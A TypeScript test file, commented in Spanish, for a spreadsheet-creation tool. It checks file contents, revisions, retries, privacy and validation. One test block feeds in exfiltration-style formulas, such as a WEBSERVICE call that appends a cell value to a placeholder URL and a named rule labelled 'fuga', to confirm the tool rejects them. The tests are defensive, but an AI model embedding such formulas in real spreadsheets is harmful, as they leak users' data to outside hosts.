/**
 * `hebra_create_sheet` (H-79) con el motor real: el núcleo de hojas de `vendor/hebra` por
 * `src/sheets`, `NodeLibraryPort` en SQLite y el escritor de documentos (`runDocumentRequest`, la
 * op `documentOps` con `action: 'create'`, B-N20). El escritor de prueba es el que cableará H-177.
 *
 * Lo que se mira:
 * - El libro creado se vuelve a leer con el lector de Hebra con lo que pidió el lote: hojas,
 *   valores, fórmulas, combinadas y paneles, también en una hoja creada en el mismo lote.
 * - Nace con su cabecera `/h` (nota de H-173): por el puerto y por el cableado de sync, y con las
 *   mismas revisiones que da su primera lectura (`openDocumentRead`).
 * - Mismo lote, mismos bytes: el reintento con el mismo `operationId` es `already`.
 * - Imagen remota y `WEBSERVICE` dan `batch_invalid`; carpeta privada y espacio de solo lectura
 *   rechazan la creación. En ningún caso rechazado se escribe nada.
 *
 * Roturas vistas en rojo al hacer el paquete (y repuestas): quitar `ensureCreatedHead` de
 * `createRequest` (rojo "nace con su cabecera"), quitar la búsqueda de funciones de red en los
 * cuerpos de regla (rojo "WEBSERVICE en una regla"), quitar la comprobación de carpeta de la
 * herramienta (rojo "no llega al escritor") y quitar el `clientID` fijo del `Y.Doc` de trabajo
 * (rojo "mismos bytes").
 */
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { PrivacyConfig } from '../../src/privacy/config';
import { PrivacyFilter } from '../../src/privacy/filter';
import type { ToolContext } from '../../src/server/context';
import { ToolError } from '../../src/server/errors';
import {
  buildSheetFile,
  DEFAULT_SHEET_NAME,
  runCreateSheet,
  type CreateSheetInput,
  type CreateSheetWriter
} from '../../src/server/tools/create-sheet';
import { createSheetAdapter, prepareSheetBase, type SheetCommand, type SheetModel } from '../../src/sheets';
import { UnlinkedStatusSource } from '../../src/status/status-source';
import { wireDocuments } from '../../src/store/document-channel';
import { openDocumentRead } from '../../src/store/document-read';
import { runDocumentRequest } from '../../src/store/document-service';
import { DOCUMENT_OPS_VERSION } from '../../src/store/document-types';
import { openNodeLibraryPort, type NodeLibraryPort } from '../../src/store/node-port';
import type { SyncStorePort } from '../../src/store/sync-port';
import { IDENTITY } from '../sync/devices';

const CONFIG: PrivacyConfig = { privateFolders: [['diario']], privateTags: ['secreto'] };
const ports: NodeLibraryPort[] = [];
const directories: string[] = [];

afterEach(async () => {
  vi.restoreAllMocks();
  for (const port of ports.splice(0)) await port.closeWhenIdle();
  for (const directory of directories.splice(0)) rmSync(directory, { recursive: true, force: true });
});

async function open(shared = false): Promise<NodeLibraryPort> {
  const directory = mkdtempSync(join(tmpdir(), 'hebra-mcp-create-sheet-'));
  directories.push(directory);
  const spaceAccess = {
    spaceId: '955480b0-c2c3-471f-aa5d-3f37ed46fe68',
    scope: 'fixture',
    authorize: async () => {},
    assertActive: () => {}
  };
  const port = await openNodeLibraryPort({
    sqlitePath: join(directory, 'library.sqlite'),
    dataDir: directory,
    ...(shared ? { spaceAccess } : {})
  });
  ports.push(port);
  if (shared) {
    await port.syncStorePort().libraryConnect({
      binding: { ...IDENTITY, libraryInstance: 'create-sheet-test' },
      relayHasRecords: true
    });
  }
  return port;
}

/** Una biblioteca con una carpeta pública y la privada `Diario`. */
async function world() {
  const port = await open();
  const { publica, diario } = await port.writeExclusive(async (store) => ({
    publica: (await store.folderCreate('root', 'Publica')).id,
    diario: (await store.folderCreate('root', 'Diario')).id
  }));
  return { port, publica, diario };
}

/** El contexto de una llamada, con el filtro de privados de `filterConfig` (por defecto el real). */
async function contextOf(port: NodeLibraryPort, config: PrivacyConfig = CONFIG, filterConfig = config): Promise<ToolContext> {
  const privacy = await (await PrivacyFilter.build(port, filterConfig)).ensureAll();
  return { port, privacy, privacyConfig: config, status: new UnlinkedStatusSource() };
}

/** El escritor que cableará H-177: la op `documentOps` en local, sin sync. */
function writerOf(port: NodeLibraryPort): CreateSheetWriter & { calls: number } {
  const writer = (async (request) => {
    writer.calls += 1;
    const outcome = await runDocumentRequest(
      { port, writeExclusive: (operation) => port.writeExclusive(operation) },
      { action: 'create', opsVersion: DOCUMENT_OPS_VERSION, ...request },
      { afterCommit: async () => ({ sync: 'not_linked' }) }
    );
    if ('created' in outcome) return { ok: true, created: outcome.created };
    if (!outcome.ok) return { ok: false, error: outcome.error };
    throw new Error('documentOps devolvió un lote, no una creación');
  }) as CreateSheetWriter & { calls: number };
  writer.calls = 0;
  return writer;
}

/** Carpetas y ficheros tal como están guardados: lo que cambiaría una escritura. */
async function snapshot(port: NodeLibraryPort): Promise<string> {
  return JSON.stringify([await port.libraryOpen(), await port.filesIndex()]);
}

async function bytesOf(port: NodeLibraryPort, fileId: string): Promise<Uint8Array> {
  const { head } = await port.documentSource().port.docRead(fileId);
  const row = await port.documentSource().port.fileRead(fileId);
  const sha = head?.baseSha256 ?? row?.sha256;
  const bytes = sha ? await port.documentSource().port.blobRead(sha) : null;
  if (!bytes) throw new Error('sin bytes');
  return bytes;
}

/** Valor de una celda A1 en el modelo leído (`null` si está vacía). */
function cell(model: SheetModel, sheetName: string, address: string): unknown {
  const sheet = model.sheets.find((s) => s.name === sheetName);
  if (!sheet) throw new Error(`no hay hoja ${sheetName}`);
  const match = /^([A-Z]+)(\d+)$/.exec(address)!;
  const col = [...match[1]!].reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0) - 1;
  const row = Number(match[2]) - 1;
  return sheet.cells.get(`${sheet.rows.idAt(row)}:${sheet.cols.idAt(col)}`) ?? null;
}

async function expectCode(promise: Promise<unknown>, code: string): Promise<ToolError> {
  const error = await promise.catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ToolError);
  expect((error as ToolError).code).toBe(code);
  return error as ToolError;
}

const LOTE: SheetCommand[] = [
  { type: 'renameSheet', sheet: DEFAULT_SHEET_NAME, name: 'Ventas' },
  { type: 'setCells', sheet: 'Ventas', start: 'A1', rows: [['Mes', 'Importe'], ['Enero', 1200], ['Febrero', 1350], ['Total', '=SUM(B2:B3)']] },
  { type: 'setFormat', sheet: 'Ventas', range: 'B2:B4', format: { numberFormatCode: '#,##0.00', bold: 'true' } },
  { type: 'merge', sheet: 'Ventas', range: 'D1:E1', expect: { 'D1:E1': null } },
  { type: 'freeze', sheet: 'Ventas', rows: 1, cols: 0 },
  { type: 'addSheet', sheet: 'Resumen', as: 'resumen' },
  { type: 'setCells', sheet: '$resumen', start: 'A1', rows: [['Total ventas', '=Ventas!B4']] }
];

describe('hebra_create_sheet (H-79)', () => {
  it('sin comandos: un .ods con una hoja vacía, visible en su carpeta', async () => {
    const { port, publica } = await world();
    const out = await runCreateSheet(await contextOf(port), { name: 'Vacio.ods', folderId: publica, operationId: 'op-1' }, writerOf(port));
    expect(out).toMatchObject({ name: 'Vacio.ods', outcome: 'saved', sync: 'not_linked' });
    const files = await port.filesIndex();
    expect(files.files.find((file) => file.id === out.id)).toMatchObject({ name: 'Vacio.ods', folderId: publica });
    const reread = await prepareSheetBase(await bytesOf(port, out.id));
    expect(reread.model.sheets.map((sheet) => sheet.name)).toEqual([DEFAULT_SHEET_NAME]);
    expect(reread.model.sheets[0]!.cells.size).toBe(0);
  });

  it('con un lote: el lector de Hebra ve hojas, valores, fórmulas, combinadas y paneles', async () => {
    const { port, publica } = await world();
    const out = await runCreateSheet(
      await contextOf(port),
      { name: 'Cuentas.ods', folder: 'Publica', ops: LOTE, operationId: 'op-1' },
      writerOf(port)
    );
    expect(out.createdIds).toEqual({ resumen: expect.any(String) });
    expect((await port.filesIndex()).files.find((file) => file.id === out.id)?.folderId).toBe(publica);
    const { model } = await prepareSheetBase(await bytesOf(port, out.id));
    expect(model.sheets.map((sheet) => sheet.name)).toEqual(['Ventas', 'Resumen']);
    expect(cell(model, 'Ventas', 'A1')).toBe('Mes');
    expect(cell(model, 'Ventas', 'B3')).toBe(1350);
    expect(cell(model, 'Ventas', 'B4')).toMatchObject({ f: { src: expect.stringContaining('SUM') } });
    expect(cell(model, 'Resumen', 'A1')).toBe('Total ventas');
    expect(cell(model, 'Resumen', 'B1')).toMatchObject({ f: expect.any(Object) });
    const ventas = model.sheets[0]!;
    expect(ventas.frozenRows).toBe(1);
    expect(ventas.merges.map((m) => [m.row, m.col, m.rowSpan, m.colSpan])).toEqual([[0, 3, 1, 2]]);
  });

  it('nace con su cabecera /h y con las revisiones de su primera lectura', async () => {
    const { port, publica } = await world();
    const out = await runCreateSheet(
      await contextOf(port),
      { name: 'Cabecera.ods', folderId: publica, ops: LOTE.slice(0, 2), operationId: 'op-1' },
      writerOf(port)
    );
    const source = port.documentSource();
    const { head, segments, pending } = await source.port.docRead(out.id);
    const row = await source.port.fileRead(out.id);
    expect(head).toMatchObject({ format: 'ods', baseSha256: row!.sha256.toLowerCase(), checkpointSha256: null });
    expect(segments).toEqual([]);
    expect(pending).toEqual([]);
    const bytes = await bytesOf(port, out.id);
    const read = await openDocumentRead(source, out.id, createSheetAdapter(await prepareSheetBase(bytes)));
    try {
      expect(out.revision).toBe(read.revision);
      expect(out.layoutRevision).toBe(read.layoutRevision);
    } finally {
      await read.close();
    }
  });

  it('con cableado de sync, la cabecera la pone ensureHead de la app', async () => {
    const { port, publica } = await world();
    const source = port.documentSource();
    const wiring = wireDocuments(source, { requestRound: async () => undefined, readBlob: async () => null });
    const ensureHead = vi.spyOn(wiring, 'ensureHead');
    const out = await runCreateSheet(await contextOf(port), { name: 'Sync.ods', folderId: publica, operationId: 'op-1' }, writerOf(port));
    expect(ensureHead).toHaveBeenCalledWith(out.id);
    expect((await source.port.docRead(out.id)).head).toMatchObject({ format: 'ods' });
  });

  it('mismo lote, mismos bytes: el reintento con el mismo operationId es already y no crea otro', async () => {
    const signal = new AbortController().signal;
    const a = await buildSheetFile(LOTE, signal);
    const b = await buildSheetFile(LOTE, signal);
    if ('code' in a || 'code' in b) throw new Error('el lote no compiló');
    expect(Buffer.from(a.bytes).equals(Buffer.from(b.bytes))).toBe(true);

    const { port, publica } = await world();
    const ctx = await contextOf(port);
    const writer = writerOf(port);
    const input: CreateSheetInput = { name: 'Una.ods', folderId: publica, ops: LOTE, operationId: 'op-1' };
    const first = await runCreateSheet(ctx, input, writer);
    const again = await runCreateSheet(ctx, input, writer);
    expect(again).toMatchObject({ id: first.id, outcome: 'already', replayed: true, revision: first.revision });
    expect((await port.filesIndex()).files.filter((file) => file.folderId === publica)).toHaveLength(1);
    await expectCode(runCreateSheet(ctx, { ...input, name: 'Otra.ods' }, writer), 'operation_id_reused');
  });

  describe('sin red: imagen remota y funciones de red dan batch_invalid y no escriben', () => {
    const cases: Array<[string, Partial<CreateSheetInput>, string]> = [
      ['IMAGE con una URL en una celda', { ops: [{ type: 'setCells', sheet: DEFAULT_SHEET_NAME, start: 'A1', rows: [['=IMAGE("https://ejemplo.com/a.png")']] }] }, 'ops.0.rows.0.0'],
      ['WEBSERVICE en una celda', { ops: [{ type: 'setCells', sheet: DEFAULT_SHEET_NAME, start: 'B2', rows: [[1, '=WEBSERVICE("https://ejemplo.com/?d="&A1)']] }] }, 'ops.0.rows.0.1'],
      ['WEBSERVICE en una regla', { ops: [{ type: 'putRule', kind: 'name', body: { name: 'fuga', formula: 'WEBSERVICE("https://ejemplo.com")' } }] }, 'ops.0.body'],
      ['una imagen por URL en assets', { assets: [{ ref: 'logo', url: 'https://ejemplo.com/logo.png' }] }, 'assets.0'],
      ['un comando inventado de imagen', { ops: [{ type: 'insertImage', sheet: DEFAULT_SHEET_NAME, href: 'https://ejemplo.com/a.png' }] }, 'ops.0.type'],
      ['un fondo con imagen en el formato', { ops: [{ type: 'setFormat', sheet: DEFAULT_SHEET_NAME, range: 'A1', format: { backgroundImage: 'url(https://ejemplo.com/a.png)' } }] }, 'ops.0.format']
    ];
    it.each(cases)('%s', async (_label, patch, path) => {
      const { port, publica } = await world();
      const before = await snapshot(port);
      const writer = writerOf(port);
      const error = await expectCode(
        runCreateSheet(await contextOf(port), { name: 'Fuga.ods', folderId: publica, operationId: 'op-1', ...patch } as CreateSheetInput, writer),
        'batch_invalid'
      );
      expect(error.extra?.issues).toEqual([expect.objectContaining({ path })]);
      expect(JSON.stringify(error.extra)).not.toContain('ejemplo.com');
      expect(writer.calls).toBe(0);
      expect(await snapshot(port)).toBe(before);
    });
  });

  it('una carpeta privada da not_found y no llega al escritor; el escritor también la rechaza en su turno', async () => {
    const { port, diario } = await world();
    const before = await snapshot(port);
    const writer = writerOf(port);
    for (const input of [{ folderId: diario }, { folder: 'Diario' }, { folderId: 'no-existe' }]) {
      await expectCode(runCreateSheet(await contextOf(port), { name: 'Secreto.ods', operationId: 'op-1', ...input }, writer), 'not_found');
    }
    expect(writer.calls).toBe(0);
    // Un filtro de la llamada que no conoce la carpeta privada (la configuración cambió por
    // medio): la herramienta deja pasar y el turno del escritor la rechaza con la de verdad.
    const blind = await contextOf(port, CONFIG, { privateFolders: [], privateTags: [] });
    await expectCode(runCreateSheet(blind, { name: 'Secreto.ods', folderId: diario, operationId: 'op-2' }, writer), 'not_found');
    expect(writer.calls).toBe(1);
    expect(await snapshot(port)).toBe(before);
  });

  it('un espacio de solo lectura rechaza la creación sin escribir; con escritura, crea', async () => {
    const space: PrivacyConfig = { privateFolders: [], privateTags: ['secreto'] };
    const incoming = (minClient: number): Parameters<SyncStorePort['syncApplyPage']>[0] => [
      {
        id: 'shared-note',
        rev: 1,
        minClient,
        deleted: false,
        plaintextHash: 'fixture-1',
        fields: {
          kind: 'note', folderId: 'root', body: '# Compartida', favorite: false,
          createdAt: 1, updatedAt: 1, trashedAt: null, conflictOf: null,
          conflictAt: null, conflictDevice: null
        }
      }
    ];
    const readonly = await open(true);
    await readonly.syncStorePort().syncApplyPage(incoming(3));
    const before = await snapshot(readonly);
    await expectCode(
      runCreateSheet(await contextOf(readonly, space), { name: 'Espacio.ods', ops: LOTE.slice(0, 2), operationId: 'op-1' }, writerOf(readonly)),
      'client_outdated'
    );
    expect(await snapshot(readonly)).toBe(before);

    const writable = await open(true);
    const made = await runCreateSheet(await contextOf(writable, space), { name: 'Espacio.ods', operationId: 'op-1' }, writerOf(writable));
    expect((await writable.filesIndex()).files.map((file) => file.id)).toContain(made.id);
  });

  it('un homónimo visible es file_exists con su id; un nombre que no es .ods, invalid_input', async () => {
    const { port, publica } = await world();
    const ctx = await contextOf(port);
    const writer = writerOf(port);
    const first = await runCreateSheet(ctx, { name: 'Cuentas.ods', folderId: publica, operationId: 'op-1' }, writer);
    const error = await expectCode(runCreateSheet(ctx, { name: 'cuentas.ODS', folderId: publica, operationId: 'op-2' }, writer), 'file_exists');
    expect(error.extra).toEqual({ id: first.id });
    for (const name of ['Cuentas.xlsx', 'Cuentas', 'a/b.ods', ' Cuentas.ods']) {
      await expectCode(runCreateSheet(ctx, { name, folderId: publica, operationId: 'op-3' }, writer), 'invalid_input');
    }
    await expectCode(runCreateSheet(ctx, { name: 'X.ods', folder: 'Publica', folderId: publica, operationId: 'op-4' }, writer), 'invalid_input');
    await expectCode(runCreateSheet(ctx, { name: 'X.ods', operationId: '' }, writer), 'invalid_input');
  });

  it('hojas ocultas: addSheet con `hidden` crea la hoja oculta y sin él sale visible', async () => {
    const { port, publica } = await world();
    const writer = writerOf(port);
    const hidden = await runCreateSheet(
      await contextOf(port),
      { name: 'Oculta.ods', folderId: publica, operationId: 'op-1', ops: [{ type: 'addSheet', sheet: 'Notas', hidden: true }] },
      writer
    );
    const base = await prepareSheetBase(await bytesOf(port, hidden.id));
    expect(base.model.sheets.map((sheet) => [sheet.name, sheet.hidden === true])).toEqual([
      [DEFAULT_SHEET_NAME, false],
      ['Notas', true]
    ]);
    // Sin el campo, la hoja nueva sale visible, como la de partida.
    const out = await runCreateSheet(
      await contextOf(port),
      { name: 'Visible.ods', folderId: publica, operationId: 'op-2', ops: [{ type: 'addSheet', sheet: 'Notas' }] },
      writer
    );
    const { model } = await prepareSheetBase(await bytesOf(port, out.id));
    expect(model.sheets.map((sheet) => [sheet.name, sheet.hidden === true])).toEqual([
      [DEFAULT_SHEET_NAME, false],
      ['Notas', false]
    ]);
  });

  it('ocultar la única hoja visible al crear es batch_invalid y no escribe', async () => {
    const { port, publica } = await world();
    const before = await snapshot(port);
    const writer = writerOf(port);
    await expectCode(
      runCreateSheet(
        await contextOf(port),
        { name: 'Sin.ods', folderId: publica, operationId: 'op-1', ops: [{ type: 'setSheetHidden', sheet: DEFAULT_SHEET_NAME, hidden: true }] },
        writer
      ),
      'batch_invalid'
    );
    expect(await snapshot(port)).toBe(before);
  });

  it('lo que depende del libro lo decide compileBatch: una hoja que no existe o un alias desconocido', async () => {
    const signal = new AbortController().signal;
    expect(await buildSheetFile([{ type: 'setCells', sheet: 'NoExiste', start: 'A1', rows: [[1]] }], signal)).toMatchObject({
      code: 'batch_invalid',
      issues: [{ opIndex: 0, path: 'ops.0' }]
    });
    expect(await buildSheetFile([{ type: 'setCells', sheet: '$nadie', start: 'A1', rows: [[1]] }], signal)).toMatchObject({
      code: 'batch_invalid',
      issues: [{ opIndex: 0 }]
    });
    expect(
      await buildSheetFile(
        [
          { type: 'setCells', sheet: DEFAULT_SHEET_NAME, start: 'A1', rows: [[1]] },
          { type: 'setCells', sheet: DEFAULT_SHEET_NAME, start: 'A1', rows: [[2]], expect: { A1: 5 } }
        ],
        signal
      )
    ).toMatchObject({ code: 'precondition_failed', opIndex: 1 });
  });

  it('un lote que pasa del tope de operaciones compiladas es document_too_complex', async () => {
    const wide: SheetCommand = { type: 'setFormat', sheet: DEFAULT_SHEET_NAME, range: 'A1:C2', format: { bold: 'true' } };
    const signal = new AbortController().signal;
    expect(await buildSheetFile([wide, wide], signal, { maxCompiledOps: 12 })).not.toHaveProperty('code');
    expect(await buildSheetFile([wide, wide, wide], signal, { maxCompiledOps: 12 })).toEqual({ code: 'document_too_complex' });
  });
});
